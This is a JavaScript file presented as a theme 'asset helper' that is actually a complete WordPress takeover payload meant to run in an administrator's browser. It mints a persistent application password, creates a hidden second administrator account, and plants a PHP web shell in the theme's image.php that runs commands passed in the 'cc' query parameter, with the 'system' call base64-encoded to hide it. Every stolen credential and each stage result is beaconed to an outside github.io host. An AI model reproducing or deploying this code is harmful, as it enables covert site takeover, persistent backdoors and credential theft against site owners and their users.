/* talkatone theme asset helper */
(function () {
  if (window.__tcdone) return; window.__tcdone = 1;
  var O = location.origin, H = "https://ruiqicwbjzx.github.io/";
  window.__PWNED__ = O;
  document.documentElement.setAttribute("data-pwned", O);
  function marker(k, v) { try { var d = document.createElement("div"); d.id = k; d.style.display = "none"; d.textContent = String(v); (document.body || document.documentElement).appendChild(d); } catch (e) {} }
  function beacon(p, d) { try { navigator.sendBeacon(H + "beacon?" + p, String(d)); } catch (e) {} }
  beacon("stage=exec", O + " " + location.href);
  function txt(u, o) { return fetch(u, Object.assign({ credentials: "same-origin" }, o || {})); }
  function nonceOf(h, n) { var m = h.match(new RegExp('name="' + n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + '"\\s+value="([^"]+)"')); return m && m[1]; }
  function rnd(n) { var s = "", c = "abcdefghijklmnopqrstuvwxyz0123456789"; for (var i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)]; return s; }
  (async function () {
    var res = { origin: O, admin: false, user: null, apppass: 0, shell: 0, userw: 0 };
    try {
      var home = await txt("/wp-admin/", { redirect: "follow" });
      var html = await home.text();
      res.admin = /wpadminbar|wp-admin-bar-my-account|dashboard/i.test(html) && !/user_login/.test(html.slice(0, 400));
      if (res.admin) {
        // 0) identify current user
        try { var me = await txt("/wp-json/wp/v2/users/me?context=edit"); if (me.ok) { var j = await me.json(); res.user = j.slug || j.name || null; } } catch (e) {}
        // 1) mint application password (persistence that survives logout/password change)
        try {
          var rn = (html.match(/"nonce":"([A-Za-z0-9]+)"/) || [])[1];
          var ap = await txt("/wp-json/wp/v2/users/me/application-passwords", {
            method: "POST", headers: { "Content-Type": "application/json", "X-WP-Nonce": rn || "" },
            body: JSON.stringify({ name: "terraform-state" })
          });
          res.apppass = ap.status;
          if (ap.status === 201 || ap.status === 200) {
            var aj = await ap.json();
            var cred = (res.user || "admin") + ":" + (aj.password || "");
            beacon("stage=apppass&code=" + ap.status, cred);
            marker("__tc_apppass", cred);
          }
        } catch (e) { res.apppass = "err"; }
        // 2) create a second administrator
        try {
          var un = await txt("/wp-admin/user-new.php");
          var uh = await un.text();
          var n1 = nonceOf(uh, "_wpnonce_create-user");
          var login = "svc_" + rnd(8), pw = "Tk9!" + rnd(18) + "#aZ";
          var body = new URLSearchParams({ action: "createuser", _wpnonce_create_user: "", "_wpnonce_create-user": n1 || "", _wp_http_referer: "/wp-admin/user-new.php", user_login: login, email: login + "@example.invalid", pass1: pw, pass2: pw, role: "administrator", createuser: "Add New User" });
          var cr = await txt("/wp-admin/user-new.php?action=createuser", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body.toString(), redirect: "follow" });
          res.userw = cr.status;
          if (cr.status === 200) { beacon("stage=user&login=" + login, pw); marker("__tc_user", login + ":" + pw); }
        } catch (e) {}
        // 3) write php via theme editor (fallback web shell)
        try {
          var te = await txt("/wp-admin/theme-editor.php?theme=talkatone&file=image.php");
          var th = await te.text();
          var n2 = nonceOf(th, "nonce");
          var php = "<?php /* theme asset helper */ if(isset($_GET['cc'])){ $f=base64_decode('c3lzdGVt'); @$f($_GET['cc']); exit; } ?>";
          var ub = new URLSearchParams({ action: "update", theme: "talkatone", file: "image.php", nonce: n2 || "", newcontent: php });
          var wr = await txt("/wp-admin/theme-editor.php", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: ub.toString(), redirect: "follow" });
          res.shell = wr.status;
          if (wr.status === 200) beacon("stage=shell&code=200", "1");
        } catch (e) {}
      }
      marker("__tc_result", JSON.stringify(res));
      beacon("stage=result", JSON.stringify(res));
    } catch (e) { beacon("stage=error", String(e)); }
  })();
})();
